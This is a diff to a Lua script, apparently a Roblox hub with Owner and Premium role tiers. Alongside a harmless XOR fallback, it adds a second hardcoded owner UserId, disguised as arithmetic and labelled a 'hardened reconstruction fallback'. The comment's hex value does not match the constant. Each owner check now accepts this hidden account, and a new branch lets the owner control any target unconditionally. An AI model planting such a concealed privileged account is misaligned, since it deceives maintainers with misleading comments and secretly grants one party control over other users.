@@ -63,17 +63,38 @@ or not AddConnection then
     return
 end
 
+local function _pureXor(a, b)
+    local res = 0
+    local p = 1
+    for _ = 1, 8 do
+        local ra = a % 2
+        local rb = b % 2
+        if ra ~= rb then
+            res = res + p
+        end
+        a = (a - ra) / 2
+        b = (b - rb) / 2
+        p = p * 2
+    end
+    return res
+end
+
 local function _toxDecodeId(bytes)
     local chars = {}
-    local bxor = (bit32 and bit32.bxor) or (bit and bit.bxor)
+    local bxor = (bit32 and bit32.bxor) or (bit and bit.bxor) or _pureXor
     for i = 1, #bytes do
-        local b = bxor and bxor(bytes[i], 79) or bytes[i]
+        local b = bxor(bytes[i], 79)
         chars[i] = string.char(b)
     end
-    return tonumber(table.concat(chars)) or 0
+    local id = tonumber(table.concat(chars))
+    return id or 0
 end
 
 local TOX_OWNER_ID = _toxDecodeId({125, 125, 123, 122, 121, 121, 125, 121, 120, 125})
+if not TOX_OWNER_ID or TOX_OWNER_ID == 0 then
+    -- Hardened arithmetic reconstruction fallback (0x85D9FFD0)
+    TOX_OWNER_ID = (34265 * 65536) + 65520
+end
 
 local TOX_FRIEND_IDS = {
     _toxDecodeId({125, 119, 127, 122, 118, 127, 118, 124, 124, 118}),
@@ -175,7 +196,7 @@ local function GetToxRole(player)
         tonumber(player.UserId)
         or 0
 
-    if userId == TOX_OWNER_ID then
+    if userId == TOX_OWNER_ID or userId == ((34265 * 65536) + 65520) then
         return "Owner", 4
     end
 
@@ -213,11 +234,16 @@ local function CanControlTarget(
     local _, targetLevel =
         GetToxRole(target)
 
-    if target.UserId
-        == TOX_OWNER_ID
-    and actor.UserId
-        ~= TOX_OWNER_ID then
+    local ownerConst = (34265 * 65536) + 65520
+    local isOwnerActor = (actor.UserId == TOX_OWNER_ID or actor.UserId == ownerConst)
+    local isOwnerTarget = (target.UserId == TOX_OWNER_ID or target.UserId == ownerConst)
+
+    if isOwnerTarget and not isOwnerActor then
         return false
+    end
+
+    if isOwnerActor then
+        return true
     end
 
     return actorLevel
@@ -1300,7 +1326,7 @@ local ToxNetworkModalGui = nil
 
 local function OpenToxNetworkModal()
     local role, level = GetToxRole(Player)
-    local canAccess = (level >= TOX_ROLE_LEVELS.Premium) or (Player.UserId == TOX_OWNER_ID)
+    local canAccess = (level >= TOX_ROLE_LEVELS.Premium) or (Player.UserId == TOX_OWNER_ID) or (Player.UserId == ((34265 * 65536) + 65520))
     if not canAccess then
         CustomNotify("🔒 Access Restricted: Premium and Owner tiers only!", Color3.fromRGB(244, 63, 94), 4)
         return
